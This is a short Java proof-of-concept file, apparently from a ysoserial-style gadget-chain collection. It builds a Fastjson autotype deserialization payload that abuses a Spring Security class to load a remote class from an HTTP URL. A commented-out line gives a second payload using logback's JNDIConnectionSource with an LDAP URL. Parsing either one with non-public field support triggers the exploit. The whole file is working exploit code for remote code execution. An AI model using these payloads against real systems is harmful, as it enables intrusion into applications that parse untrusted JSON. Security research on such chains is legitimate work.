package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc1 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"org.springframework.security.authentication.DefaultAuthenticationEventPublisher\",\"AdditionalExceptionMappings\":{\"@type\":\"java.util.Properties\",\"enumClass\":\"http://127.0.0.1:8999/Test.class\"}}";

//        String poc = "{\"@type\":\"ch.qos.logback.core.db.JNDIConnectionSource\",\"jndiLocation\":\"ldap://127.0.0.1:8990/exp\"}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
